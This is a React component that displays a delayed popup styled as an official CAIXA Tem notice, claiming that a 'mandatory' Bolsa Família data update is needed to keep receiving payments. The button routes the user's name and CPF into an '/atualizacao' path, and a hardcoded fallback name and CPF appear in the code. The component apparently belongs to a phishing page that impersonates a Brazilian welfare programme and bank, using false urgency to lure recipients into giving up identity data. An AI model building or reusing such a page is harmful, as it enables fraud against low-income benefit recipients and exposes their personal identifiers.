import { useEffect, useState } from 'react';
import { useLocation } from 'wouter';
import { Lock } from 'lucide-react';

interface PopupBolsaFamiliaProps {
  nome?: string;
  cpf?: string;
}

export function PopupBolsaFamilia({ nome, cpf }: PopupBolsaFamiliaProps) {
  const [isVisible, setIsVisible] = useState(false);
  const [, navigate] = useLocation();

  useEffect(() => {
    // Mostrar o popup após 2 segundos
    const timer = setTimeout(() => {
      setIsVisible(true);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  const handleUpdateClick = () => {
    // Navegar para a página de atualização, passando nome e CPF como parâmetros
    if (nome && cpf) {
      navigate(`/atualizacao/${nome}/${cpf}`);
    } else {
      navigate('/atualizacao/edson/38176475572');
    }
  };

  if (!isVisible) return null;

  return (
    <div className="fixed inset-0 flex items-center justify-center z-50 bg-black bg-opacity-50 p-4">
      <div className="bg-white rounded-xl shadow-lg max-w-md w-full mx-auto overflow-hidden">
        {/* Ícone centralizado */}
        <div className="flex justify-center mt-6 mb-4">
          <div className="relative">
            <div className="bg-[#ffefd0] rounded-full w-20 h-20 flex items-center justify-center">
              <div className="text-[#e8a551]">
                {/* Ícone de rosto sorridente em formato de chat/bolha mais parecido com a imagem */}
                <svg width="50" height="50" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 13.8214 2.48697 15.5291 3.33782 17L2.5 21.5L7 20.6622C8.47087 21.513 10.1786 22 12 22Z" fill="#e8a551" stroke="#e8a551" strokeWidth="0.5"/>
                  <circle cx="8.5" cy="10.5" r="1.5" fill="#7D5425"/>
                  <circle cx="15.5" cy="10.5" r="1.5" fill="#7D5425"/>
                  <path d="M8 14.5C9.5 16 14.5 16 16 14.5" stroke="#7D5425" strokeWidth="1.5" strokeLinecap="round"/>
                </svg>
              </div>
            </div>
            {/* Ícone de cadeado mais parecido com a imagem de referência */}
            <div className="absolute bottom-0 right-0 bg-[#e8a551] rounded-full w-8 h-8 flex items-center justify-center border-2 border-white">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
              </svg>
            </div>
          </div>
        </div>

        {/* Título */}
        <h2 className="text-[#333] text-2xl font-bold text-center mb-2">
          Regularização obrigatória do Bolsa Família
        </h2>

        {/* Descrição */}
        <p className="text-[#666] text-center px-6 mb-4">
          Para continuar recebendo o Bolsa Família normalmente você precisa atualizar seus dados no CAIXA Tem.
        </p>

        {/* Aviso Importante */}
        <div className="mx-6 mb-4 bg-[#fff2f2] border border-[#ffe6e6] rounded-md p-3">
          <p className="text-[#e05252] text-center text-sm">
            <span className="font-bold">AVISO IMPORTANTE:</span> Atualização cadastral obrigatória para manter o pagamento do Bolsa Família em dia.
          </p>
        </div>

        {/* Texto de instruções */}
        <div className="px-6 text-center text-[#888] text-sm mb-1">
          <p>Se você precisar, você pode procurar uma agência CAIXA.</p>
        </div>
        <div className="px-6 text-center text-[#888] text-sm mb-6">
          <p>Código: DOI 404</p>
        </div>

        {/* Botão */}
        <div className="px-6 pb-6">
          <button
            onClick={handleUpdateClick}
            className="w-full py-4 bg-[#ee8435] hover:bg-[#df7426] text-white font-medium rounded-md transition-colors"
          >
            Atualizar meu cadastro agora
          </button>
        </div>
      </div>
    </div>
  );
}